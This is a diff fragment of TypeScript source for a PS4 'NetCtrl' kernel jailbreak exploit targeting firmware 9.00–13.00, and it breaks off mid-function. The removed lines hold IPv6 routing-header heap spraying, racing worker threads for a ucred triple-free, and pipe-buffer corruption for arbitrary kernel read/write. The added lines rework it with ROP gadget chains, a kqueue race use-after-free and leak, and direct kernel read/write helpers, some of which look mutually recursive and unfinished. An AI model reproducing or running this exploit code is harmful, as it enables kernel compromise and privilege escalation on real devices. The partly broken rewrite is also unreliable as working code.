-    worker.thread_id = thread_id    // Save thread ID
-  }
-}
-
-function nanosleep_fun (nsec: number) {
-  write64(nanosleep_timespec, Math.floor(nsec / 1e9))    // tv_sec
-  write64(nanosleep_timespec.add(8), nsec % 1e9)         // tv_nsec
-  nanosleep(nanosleep_timespec)
-}
-
-function wait_for (addr: BigInt, threshold: number) {
-  while (!read64(addr).eq(threshold)) {
-    nanosleep_fun(1)
-  }
-}
-
-function trigger_iov_recvmsg () {
-  let worker: Worker
-  // Clear done signals
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    worker = iov_recvmsg_workers[i]!
-    write64(worker.done, 0)
-    // debug("Worker done: " + hex(read64(worker.done)) );
-  }
-
-  // Send Init signal
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    worker = iov_recvmsg_workers[i]!
-    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
-    }
-  }
-}
-
-function wait_iov_recvmsg () {
-  let worker: Worker
-  // Wait for completition
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    worker = iov_recvmsg_workers[i]!
-    wait_for(worker.done, 1)
-    // debug("Worker done: " + hex(read64(worker.done)) );
-  }
-
-  // debug("iov_recvmsg workers run OK");
-}
-
-function trigger_ipv6_spray_and_read () {
-  // Worker information is already loaded
-
-  // Clear done signals
-  write64(spray_ipv6_worker.done, 0)
-
-  // Spawn ipv6_sockets spray and read worker
-  // Passing an stack addr reserved for each iteration
-  let ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack)
-  if (ret.eq(BigInt_Error)) {
-    throw new Error('Could not spray_ipv6_worker')
-  }
-  const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
-  spray_ipv6_worker.thread_id = thread_id        // Save thread ID
-
-  // Send Init signal
-  ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
-  if (ret.eq(BigInt_Error)) {
-    throw new Error("Could not signal 'run' spray_ipv6_worker")
-  }
-}
-
-function wait_ipv6_spray_and_read () {
-  // Wait for completition
-  wait_for(spray_ipv6_worker.done, 1)
-}
-
-function trigger_uio_readv () {
-  let worker: Worker
-  // Clear done signals
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_readv_workers[i]!
-    write64(worker.done, 0)
-    // debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
-  }
-
-  // Send Init signal
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_readv_workers[i]!
-    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
-    }
-  }
-}
-
-function wait_uio_readv () {
-  let worker: Worker
-  // Wait for completition
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_readv_workers[i]!
-    wait_for(worker.done, 1)
-  }
-  // debug("Exit wait_uio_readv()");
-}
-
-function trigger_uio_writev () {
-  let worker: Worker
-  // Clear done signals
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i]!
-    write64(worker.done, 0)
-    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
-  }
-
-  // Send Init signal
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i]!
-    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
-    }
-  }
-}
-
-function wait_uio_writev () {
-  let worker: Worker
-  // Wait for completition
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i]!
-    wait_for(worker.done, 1)
-  }
-  // debug("Exit wait_uio_writev()");
-}
-
-function init () {
-  log('=== PS4 NetCtrl Jailbreak ===')
-  log('build: %VERSION_STRING%')
-  log('tag: %VERSION_TAG%')
-
-  FW_VERSION = get_fwversion()
-  log('Detected PS4 firmware: ' + FW_VERSION)
-
-  if (FW_VERSION === null) {
-    log('Failed to detect PS4 firmware version.\nAborting...')
-    send_notification('Failed to detect PS4 firmware version.\nAborting...')
-    return false
-  }
-
-  const compare_version = (a: string, b: string) => {
-    const a_arr = a.split('.')
-    const amaj = Number(a_arr[0])
-    const amin = Number(a_arr[1])
-    const b_arr = b.split('.')
-    const bmaj = Number(b_arr[0])
-    const bmin = Number(b_arr[1])
-    return amaj === bmaj ? amin - bmin : amaj - bmaj
-  }
-
-  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
-    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...')
-    send_notification('Unsupported PS4 firmware\nAborting...')
-    return false
-  }
-
-  kernel_offset = get_kernel_offset(FW_VERSION)
-  log('Kernel offsets loaded for FW ' + FW_VERSION)
-
-  return true
-}
-
-let prev_core: number = -1
-let prev_rtprio: number = -1
-let cleanup_called: boolean = false
-
-function setup () {
-  debug('Preparing netctrl...')
-
-  prev_core = get_current_core()
-  prev_rtprio = get_rtprio()
-  pin_to_core(MAIN_CORE)
-  set_rtprio(MAIN_RTPRIO)
-  debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)
-
-  // Prepare spray buffer.
-  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE)
-  // debug("this is spray_rthdr_len: " + hex(spray_rthdr_len));
-
-  // Fill spray_rthdr_rop for ipv6_sockets spray
+  // spray all sockets
   for (let i = 0; i < IPV6_SOCK_NUM; i++) {
-    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE)
-    // Prefill with tagged information
-    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i)
+    rop.push(gadgets.POP_RDI_RET, ipv6_socks[i]!);
+    rop.push(gadgets.POP_RSI_RET, new BigInt(IPPROTO_IPV6));
+    rop.push(gadgets.POP_RDX_RET, new BigInt(IPV6_RTHDR));
+    rop.push(gadgets.POP_RCX_RET, spray_rthdr_rop.add(i * UCRED_SIZE));
+    rop.push(gadgets.POP_R8_RET, new BigInt(spray_rthdr_len));
+    rop.push(setsockopt_wrapper);
   }
 
-  // Prepare msg iov buffer.
-  write64(msg.add(0x10), msgIov)      // msg_iov
-  write64(msg.add(0x18), MSG_IOV_NUM) // msg_iovlen
-
-  const dummyBuffer = malloc(0x1000)
-  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000)
-
-  write64(uioIovRead.add(0x00), dummyBuffer)
-  write64(uioIovWrite.add(0x00), dummyBuffer)
-
-  // Create socket pair for uio spraying.
-  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock)
-  uio_sock_0 = read32(uio_sock)
-  uio_sock_1 = read32(uio_sock.add(4))
-
-  // Create socket pair for iov spraying.
-  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock)
-  iov_sock_0 = read32(iov_sock)
-  iov_sock_1 = read32(iov_sock.add(4))
-
-  // Set up sockets for spraying.
-  for (let i = 0; i < ipv6_socks.length; i++) {
-    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0)
+  // read back all sockets
+  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
+    rop.push(gadgets.POP_RDI_RET, ipv6_socks[i]!);
+    rop.push(gadgets.POP_RSI_RET, new BigInt(IPPROTO_IPV6));
+    rop.push(gadgets.POP_RDX_RET, new BigInt(IPV6_RTHDR));
+    rop.push(gadgets.POP_RCX_RET, read_rthdr_rop.add(i * 8));   // save result
+    rop.push(gadgets.POP_R8_RET, check_len);
+    rop.push(getsockopt_wrapper);
   }
 
-  // Initialize pktopts.
-  free_rthdrs(ipv6_socks)
+  // signal done & exit
+  rop.push(gadgets.POP_RDI_RET, done);
+  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+  rop.push(gadgets.POP_RDI_RET, new BigInt(0));
+  rop.push(thr_exit_wrapper);
 
-  // Create pipes for arbitrary kernel r/w
-  pipe(pipe_sock)
-  master_pipe[0] = read32(pipe_sock)
-  master_pipe[1] = read32(pipe_sock.add(4))
-
-  pipe(pipe_sock)
-  victim_pipe[0] = read32(pipe_sock)
-  victim_pipe[1] = read32(pipe_sock.add(4))
-
-  masterRpipeFd = master_pipe[0]
-  masterWpipeFd = master_pipe[1]
-  victimRpipeFd = victim_pipe[0]
-  victimWpipeFd = victim_pipe[1]
-
-  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK)
-  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK)
-  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK)
-  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK)
-
-  // Create and Init Thread Workers
-  create_workers()
-
-  init_workers()
-
-  debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
+  return { rop, loop_size: 0 };
 }
 
-function cleanup (kill_workers = false) {
-  if (cleanup_called) return
-  cleanup_called = true
-  debug('Cleaning up...')
+const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
+const check_len      = malloc(4);
+write32(check_len, 8);
 
-  // Close ipv6 sockets first (not blocking)
-  for (let i = 0; i < ipv6_socks.length; i++) {
-    close(ipv6_socks[i])
-  }
-
-  // Signal workers to unblock from read(), then kill them
-  // Workers loop: read(pipe) -> work -> done -> repeat
-  // We write to unblock, then kill before they loop back
-
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    const worker = iov_recvmsg_workers[i]
-    if (worker !== undefined) {
-      // Write to unblock from read()
-      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-      if (kill_workers && worker.thread_id !== undefined) {
-        thr_kill(worker.thread_id, 9) // SIGKILL
-      }
-    }
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    const worker = uio_readv_workers[i]
-    if (worker !== undefined) {
-      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-      if (kill_workers && worker.thread_id !== undefined) {
-        thr_kill(worker.thread_id, 9) // SIGKILL
-      }
-    }
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    const worker = uio_writev_workers[i]
-    if (worker !== undefined) {
-      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
-      if (kill_workers && worker.thread_id !== undefined) {
-        thr_kill(worker.thread_id, 9) // SIGKILL
-      }
-    }
-  }
-
-  if (spray_ipv6_worker !== undefined) {
-    write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
-    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
-      thr_kill(spray_ipv6_worker.thread_id, 9) // SIGKILL
-    }
-  }
-
-  // Now close the main sockets (workers are dead or unblocked)
-  close(new BigInt(uio_sock_1))
-  close(new BigInt(uio_sock_0))
-  close(new BigInt(iov_sock_1))
-  close(new BigInt(iov_sock_0))
-
-  // Skip uaf_socket - hangs
-  // if (uaf_socket !== undefined) {
-  //   close(new BigInt(uaf_socket))
-  // }
-
-  if (prev_core >= 0) {
-    debug('Restoring to previous core: ' + prev_core)
-    pin_to_core(prev_core)
-    prev_core = -1
-  }
-
-  set_rtprio(prev_rtprio)
-
-  debug('Cleanup completed')
+/* ============ trigger IPv6 spray (not spawned automatically) ============ */
+function trigger_ipv6_spray_and_read(): void {
+  write64(spray_ipv6_worker.done, 0);
+  const ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
+  if (ret.eq(BigInt_Error)) throw new Error('spray_ipv6_worker spawn failed');
+  spray_ipv6_worker.thread_id = Number(ret.and(0xFFFFFFFF));
+  if (write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1).eq(BigInt_Error))
+    throw new Error('failed to start spray worker');
+}
+function wait_ipv6_spray_and_read(): void {
+  wait_for(spray_ipv6_worker.done, 1);
 }
 
-function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
-  for (let i = 0; i < len; i = i + 8) {
-    write64(buf.add(i), val)
+/* ============ kqueue race UAF ============ */
+function kq_race_worker_rop(ready: BigInt, runFd: BigInt, signalBuf: BigInt): { rop: BigInt[]; loopSize: number } {
+  const rop: BigInt[] = [new BigInt(0)];
+
+  // pin & priority
+  const mask = malloc(0x10); write16(mask, 1 << MAIN_CORE);
+  rop.push(gadgets.POP_RDI_RET, new BigInt(3));
+  rop.push(gadgets.POP_RSI_RET, new BigInt(1));
+  rop.push(gadgets.POP_RDX_RET, BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET, new BigInt(0x10));
+  rop.push(gadgets.POP_R8_RET, mask);
+  rop.push(cpuset_setaffinity_wrapper);
+
+  const rtbuf = malloc(4); write16(rtbuf, PRI_REALTIME); write16(rtbuf.add(2), MAIN_RTPRIO);
+  rop.push(gadgets.POP_RDI_RET, new BigInt(1));
+  rop.push(gadgets.POP_RSI_RET, new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET, rtbuf);
+  rop.push(rtprio_thread_wrapper);
+
+  // signal ready
+  rop.push(gadgets.POP_RDI_RET, ready);
+  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  // wait for start
+  rop.push(gadgets.POP_RDI_RET, runFd);
+  rop.push(gadgets.POP_RSI_RET, signalBuf);
+  rop.push(gadgets.POP_RDX_RET, new BigInt(1));
+  rop.push(read_wrapper);
+
+  // infinite loop: kqueue(); close(rax)
+  const loopStart = rop.length;
+  rop.push(kqueue_wrapper);
+  rop.push(gadgets.MOV_RDI_RAX_RET);   // MUST EXIST; otherwise use a stack pivot
+  rop.push(close_wrapper);
+  rop.push(gadgets.JMP_REL);
+  return { rop, loopSize: 3 };
+}
+
+function trigger_kqueue_uaf(): void {
+  const sockBuf = malloc(8);
+  kq_race_thread_ids.length = 0;
+  kq_race_run_pipes.length = 0;
+
+  // create racer threads
+  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
+    socketpair(AF_UNIX, SOCK_STREAM, 0, sockBuf);
+    const r = read32(sockBuf);
+    const w = read32(sockBuf.add(4));
+    const ready  = kq_race_ready.add(8 * i);
+    const signal = kq_race_signal_buf.add(8 * i);
+    const { rop, loopSize } = kq_race_worker_rop(ready, new BigInt(r), signal);
+    const tid = Number(spawn_thread(rop, loopSize).and(0xFFFFFFFF));
+    kq_race_thread_ids.push(tid);
+    kq_race_run_pipes.push(w);
+  }
+
+  // wait until all racers are ready
+  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
+    while (!read64(kq_race_ready.add(8 * i)).eq(1)) nanosleep_fun(100);
+  }
+
+  // kick them all off simultaneously
+  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
+    write(new BigInt(kq_race_run_pipes[i]!), kq_race_signal_buf.add(8 * i), 1);
+  }
+
+  // let them race for ~200ms
+  nanosleep_fun(200_000_000);
+
+  // kill racers
+  for (const tid of kq_race_thread_ids) thr_kill(tid, 9);
+  debug('kqueue race finished');
+}
+
+/* ============ kqueue spray & leak ============ */
+function setup_kqueue_spray(): void {
+  // adjust routing header size to KQUEUE_SIZE
+  spray_rthdr_len = build_rthdr(spray_rthdr, KQUEUE_SIZE);
+  // pre-fill spray buffer with tags
+  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
+    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 4), RTHDR_TAG | i);
   }
 }
 
-function find_twins () {
-  let count = 0
-  let val
-  let i
-  let j
-  let zeroMemoryCount = 0
+function leak_kqueue(): boolean {
+  trigger_ipv6_spray_and_read();
+  wait_ipv6_spray_and_read();
 
-  // Minimizing the usage of BigInt class
-  const spray_add = spray_rthdr.add(0x04)
-  const lead_add = leak_rthdr.add(0x04)
-
-  while (count < MAX_ROUNDS_TWIN) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return false
-      }
-    } else {
-      zeroMemoryCount = 0
-    }
-    if (count % 10 === 0) {
-      // debug("find_twins iteration: " + count);
-    }
-    for (i = 0; i < ipv6_socks.length; i++) {
-      write32(spray_add, RTHDR_TAG | i)
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
-
-      // Using pre-filled buffer to spray
-      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-    }
-    for (i = 0; i < ipv6_socks.length; i++) {
-      get_rthdr(ipv6_socks[i], leak_rthdr, 8)
-      val = read32(lead_add)
-      j = val & 0xFFFF
-      // I got 'i' socket routing header but find 'j' value
-      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
-        twins[0] = i
-        twins[1] = j
-        log('Twins found: [' + i + '] [' + j + ']')
-        return true
-      }
-    }
-    count++
-  }
-  log('find_twins failed')
-  return false
-  // cleanup();
-  // throw new Error("find_twins failed");
-}
-
-function find_triplet (master: number, other: number, iterations?: number) {
-  // debug("Enter find_triplet (" + master + ") (" + other + ")" );
-
-  if (typeof iterations === 'undefined') {
-    iterations = MAX_ROUNDS_TRIPLET
-  }
-
-  let count = 0
-  let val
-  let i
-  let j
-
-  // Minimizing the usage of BigInt class
-  const spray_add = spray_rthdr.add(0x04)
-  const leak_add = leak_rthdr.add(0x04)
-
-  while (count < iterations) {
-    if (count % 100 === 0) {
-      // debug("find_triplet iteration: " + count);
-    }
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (i === master || i === other) {
-        continue
-      }
-
-      write32(spray_add, RTHDR_TAG | i)
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
-
-      // Using pre-filled buffer to spray
-      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-    }
-
-    // for (i = 0; i < ipv6_socks.length; i++) {
-    //    if (i === master || i === other) {
-    //        continue;
-    //    }
-    get_rthdr(ipv6_socks[master], leak_rthdr, 8)
-    val = read32(leak_add)
-    j = val & 0xFFFF
-    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
-      // debug("Triplet found: [" + j + "] at iteration " + count);
-      return j
-    }
-    // }
-    count++
-  }
-  return -1
-  // cleanup();
-  // throw new Error("find_triplet failed");
-}
-
-function init_threading () {
-  const jmpbuf = malloc(0x60)
-  setjmp(jmpbuf)
-  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)))
-  saved_mxcsr = Number(read32(jmpbuf.add(0x44)))
-}
-
-const LOG_MAX_LINES = 38
-const LOG_COLORS = [
-  '#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F',
-  '#4DABF7', '#9775FA', '#DA77F2'
-]
-
-function setup_log_screen () {
-  jsmaf.root.children.length = 0
-
-  const bg = new Image({
-    url: 'file:///../download0/img/multiview_bg_VAF.png',
-    x: 0,
-    y: 0,
-    width: 1920,
-    height: 1080
-  })
-  jsmaf.root.children.push(bg)
-
-  for (let i = 0; i < LOG_COLORS.length; i++) {
-    new Style({ name: 'log' + i, color: LOG_COLORS[i], size: 20 })
-  }
-
-  const logLines: jsmaf.Text[] = []
-  const logBuf: string[] = []
-
-  for (let i = 0; i < LOG_MAX_LINES; i++) {
-    const line = new jsmaf.Text()
-    line.text = ''
-    line.style = 'log' + (i % LOG_COLORS.length)
-    line.x = 20
-    line.y = 120 + i * 20
-    jsmaf.root.children.push(line)
-    logLines.push(line)
-  }
-
-  _log = function (msg: string, screen: boolean) {
-    if (screen) {
-      logBuf.push(msg)
-      if (logBuf.length > LOG_MAX_LINES) logBuf.shift()
-      for (let i = 0; i < LOG_MAX_LINES; i++) {
-        logLines[i].text = i < logBuf.length ? logBuf[i] : ''
-      }
-    }
-    ws.broadcast(msg)
-  }
-}
-
-function yield_to_render (callback: () => void) {
-  const id = jsmaf.setInterval(function () {
-    jsmaf.clearInterval(id)
-    try {
-      callback()
-    } catch (e) {
-      log('ERROR: ' + (e as Error).message)
-      cleanup()
-    }
-  }, 0)
-}
-
-let exploit_count = 0
-let exploit_end = false
-
-function netctrl_exploit () {
-  setup_log_screen()
-
-  const supported_fw = init()
-  if (!supported_fw) {
-    return
-  }
-
-  log('Setting up exploit...')
-  yield_to_render(exploit_phase_setup)
-}
-
-function exploit_phase_setup () {
-  setup()
-  log('Workers spawned')
-  exploit_count = 0
-  exploit_end = false
-  yield_to_render(exploit_phase_trigger)
-}
-
-function exploit_phase_trigger () {
-  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W')
-    cleanup()
-    return
-  }
-
-  exploit_count++
-  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
-
-  if (!trigger_ucred_triplefree()) {
-    yield_to_render(exploit_phase_trigger)
-    return
-  }
-
-  log('Leaking kqueue...')
-  yield_to_render(exploit_phase_leak)
-}
-
-function exploit_phase_leak () {
-  if (!leak_kqueue()) {
-    yield_to_render(exploit_phase_trigger)
-    return
-  }
-
-  log('Setting up arbitrary R/W...')
-  yield_to_render(exploit_phase_rw)
-}
-
-function exploit_phase_rw () {
-  setup_arbitrary_rw()
-  log('Jailbreaking...')
-  yield_to_render(exploit_phase_jailbreak)
-}
-
-function exploit_phase_jailbreak () {
-  jailbreak()
-}
-
-function setup_arbitrary_rw () {
-  // Leak fd_files from kq_fdp.
-  const fd_files = kreadslow64(kq_fdp)
-  fdt_ofiles = fd_files.add(0x00)
-  debug('fdt_ofiles: ' + hex(fdt_ofiles))
-
-  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
-  debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
-
-  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
-  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
-
-  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
-  debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
-
-  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
-  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
-
-  // Corrupt pipebuf of masterRpipeFd.
-  write32(master_pipe_buf.add(0x00), 0)                // cnt
-  write32(master_pipe_buf.add(0x04), 0)                // in
-  write32(master_pipe_buf.add(0x08), 0)                // out
-  write32(master_pipe_buf.add(0x0C), PAGE_SIZE)        // size
-  write64(master_pipe_buf.add(0x10), victim_r_pipe_data)  // buffer
-
-  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
-
-  if (ret_write.eq(BigInt_Error)) {
-    cleanup()
-    throw new Error('Netctrl failed - Shutdown and try again')
-  }
-
-  // Test if kwriteslow worked as expected or try again
-  var kws_success = 0
-  for (var i = 0; i < 3; i++) {
-    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
-      kws_success = 1
-      break
-    }
-    debug('kwriteslow did not work - Trying again')
-    ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
-    if (ret_write.eq(BigInt_Error)) {
-      cleanup()
-      throw new Error('Netctrl failed - Shutdown and try again')
+  for (let i = 0; i < 20; i++) {
+    get_rthdr(ipv6_socks[i]!, leak_rthdr, KQUEUE_SIZE);
+    const fdp = read64(leak_rthdr.add(0x98));  // kq_fdp offset
+    if (!fdp.eq(0)) {
+      kq_fdp   = fdp;
+      kl_lock  = read64(leak_rthdr.add(0x60));
+      debug('Leaked kq_fdp: ' + hex(kq_fdp));
+      return true;
     }
   }
-
-  if (kws_success === 0) {
-    throw new Error('Netctrl failed - Shutdown and try again')
-  }
-
-  // Increase reference counts for the pipes.
-  fhold(fget(master_pipe[0]))
-  fhold(fget(master_pipe[1]))
-  fhold(fget(victim_pipe[0]))
-  fhold(fget(victim_pipe[1]))
-
-  // Remove rthdr pointers from triplets
-  remove_rthr_from_socket(ipv6_socks[triplets[0]])
-  remove_rthr_from_socket(ipv6_socks[triplets[1]])
-  remove_rthr_from_socket(ipv6_socks[triplets[2]])
-
-  // Remove triple freed file from free list
-  remove_uaf_file()
-
-  for (let i = 0; i < 0x20; i = i + 8) {
-    const readed = kread64(master_r_pipe_data.add(i))
-    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
-  }
-
-  log('Arbitrary R/W achieved')
-
-  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
+  return false;
 }
 
-function find_allproc () {
-  // Use existing master_pipe instead of creating new one
-  const pipe_0 = master_pipe[0]
-  const pipe_1 = master_pipe[1]
-  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1)
+/* ============ pipe‑based arbitrary R/W (direct, no slow path) ============ */
+function corrupt_pipe_buf(cnt: number, _in: number, out: number, size: number, buffer: BigInt): void {
+  write32(master_pipe_buf.add(0x00), cnt);
+  write32(master_pipe_buf.add(0x04), _in);
+  write32(master_pipe_buf.add(0x08), out);
+  write32(master_pipe_buf.add(0x0C), size);
+  write64(master_pipe_buf.add(0x10), buffer);
+  // apply the corruption by writing the new pipebuf into the master pipe's data
+  kwrite_direct(master_r_pipe_data!, master_pipe_buf, PIPEBUF_SIZE);
+}
 
-  debug('find_allproc - Getting pid...')
-  const pid = Number(getpid())
-  debug('find_allproc - pid: ' + pid)
+function kwrite_direct(dest: BigInt, src: BigInt, n: number): void {
+  // write to the victim's buffer (which now points where we want)
+  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
+  write(new BigInt(victimWpipeFd), src, n);
+}
+function kread_direct(dest: BigInt, src: BigInt, n: number): void {
+  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
+  read(new BigInt(victimRpipeFd), dest, n);
+}
+function kread64_direct(addr: BigInt): BigInt {
+  kread_direct(tmp, addr, 8);
+  return read64(tmp);
+}
+function kwrite64_direct(addr: BigInt, val: BigInt): void {
+  write64(tmp, val);
+  kwrite_direct(addr, tmp, 8);
+}
 
-  debug('find_allproc - Writing pid to sockopt_val_buf...')
-  write32(sockopt_val_buf, pid)
-  debug('find_allproc - Calling ioctl FIOSETOWN...')
-  const ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
-  debug('find_allproc - ioctl returned: ' + ioctl_ret)
+// file descriptor helpers
+function fhold(fp: BigInt): void {
+  const refcnt = kread64_direct(fp.add(0x28)).lo + 1;
+  kwrite64_direct(fp.add(0x28), new BigInt(refcnt));
+}
+function fget(fd: number): BigInt {
+  return kread64_direct(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
+}
 
-  debug('find_allproc - Getting fp...')
-  const fp = fget(pipe_0)
-  debug('find_allproc - fp: ' + hex(fp))
+function setup_arbitrary_rw(): void {
+  if (!kq_fdp) throw new Error('kq_fdp not leaked');
 
-  debug('find_allproc - Reading f_data...')
-  const f_data = kread64(fp.add(0x00))
-  debug('find_allproc - f_data: ' + hex(f_data))
+  // read filedesc->fd_ofiles (offset 0 in FreeBSD)
+  fdt_ofiles = kread64_direct(kq_fdp);
+  debug('fdt_ofiles: ' + hex(fdt_ofiles));
 
-  debug('find_allproc - Reading pipe_sigio...')
-  const pipe_sigio = kread64(f_data.add(0xd0))
-  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio))
+  // resolve master & victim pipe file structures
+  const master_r = kread64_direct(fdt_ofiles.add(masterRpipeFd * FILEDESCENT_SIZE));
+  const victim_r = kread64_direct(fdt_ofiles.add(victimRpipeFd * FILEDESCENT_SIZE));
+  master_r_pipe_data = kread64_direct(master_r.add(0x00));  // f_data
+  victim_r_pipe_data = kread64_direct(victim_r.add(0x00));
 
-  debug('find_allproc - Reading p...')
-  let p = kread64(pipe_sigio)
-  debug('find_allproc - initial p: ' + hex(p))
-  kernel.addr.curproc = p // Set global curproc
+  // prepare corrupt master pipebuf: buffer points to victim's data
+  write32(master_pipe_buf.add(0x00), 0);                       // cnt
+  write32(master_pipe_buf.add(0x04), 0);                       // in
+  write32(master_pipe_buf.add(0x08), 0);                       // out
+  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);               // size
+  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);      // buffer
 
-  debug('find_allproc - Walking process list...')
-  let walk_count = 0
+  kwrite_direct(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
+
+  // verify corruption
+  if (!kread64_direct(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data))
+    throw new Error('pipe corruption failed');
+
+  // increase refcounts on the pipe files to prevent accidental freeing
+  fhold(fget(masterRpipeFd));
+  fhold(fget(masterWpipeFd));
+  fhold(fget(victimRpipeFd));
+  fhold(fget(victimWpipeFd));
+
+  // hook kernel read/write helpers for jailbreak_shared
+  kernel.read_buffer = function(kaddr: BigInt, length: number): Uint8Array | null {
+    kread_direct(tmp, kaddr, length);
+    return read_buffer(tmp, length);
+  };
+  kernel.write_buffer = function(kaddr: BigInt, buf: Uint8Array): void {
+    write_buffer(tmp, buf);
